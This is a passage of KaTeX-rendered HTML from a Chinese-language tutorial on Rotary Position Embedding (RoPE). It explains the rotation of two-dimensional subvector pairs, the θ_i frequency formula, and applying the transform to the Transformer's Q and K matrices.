xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>必须为偶数）</p>
</li>
<li>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">x_{n}^{[j]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1614em;vertical-align:-0.1166em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span></span>表示第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>行第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>列的数</p>
</li>
</ul>
<p>对每一行的向量做如下操作：</p>
<p>将第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>行向量划分为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">d/2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mord">/2</span></span></span></span></span>个二维子向量，即<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>4</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>5</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>d</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>d</mi><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[x_{n}^{[1]},x_{n}^{[2]}],[x_{n}^{[3]},x_{n}^{[4]}],[x_{n}^{[5]},x_{n}^{[6]}]...[x_{n}^{[d-1]},x_{n}^{[d]}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2948em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">3</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">4</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">5</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">6</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span><span class="mord">...</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">d</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">d</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mclose">]</span></span></span></span></span>，然后依次进行下面的运算</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>θ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>θ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>θ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mi>θ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}
x_{n}^{[i]}\\
x_{n}^{[i+1]}
\end{bmatrix} = \begin{bmatrix}
 cos(n\theta_{i} ) &amp; -sin(n\theta_{i} )
\\
 sin(n\theta_{i} ) &amp; cos(n\theta_{i} )
\end{bmatrix} \begin{bmatrix}
x_{n}^{[i]}
 \\
x_{n}^{[i+1]}
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6548em;"><span style="top:-3.6548em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1548em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6548em;"><span style="top:-3.6548em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1548em;"><span/></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span></span></span></span></span></div>
<p>上式中的等号在算法实现中表示<strong>赋值更新</strong>操作，即用计算后的新值替换原向量中的对应元素。经过对每一组二维子向量依次进行上述变换后，我们便得到了 RoPE 变换后的新矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">X'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span>。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>θ</mi><mi>i</mi></msub><mo>=</mo><mn>1000</mn><msup><mn>0</mn><mrow><mo>−</mo><mfrac><mrow><mn>2</mn><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mi>d</mi></mfrac></mrow></msup><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mfrac><mi>d</mi><mn>2</mn></mfrac><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\theta_{i} = 10000^{-\frac{2(i-1)}{d} } \space , \space i \in [1,2,...,\frac{d}{2} ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.3339em;vertical-align:-0.1944em;"/><span class="mord">1000</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.1395em;"><span style="top:-3.413em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0378em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"/><span class="frac-line mtight" style="border-bottom-width:0.049em;"/></span><span style="top:-3.5021em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span/></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"/></span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"/><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">]</span></span></span></span></span></div>
<p>在Transformer中，只需要对编码器中的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>矩阵和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>矩阵进行RoPE变换(<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>K</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q = RoPE(Q),K = RoPE(K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span 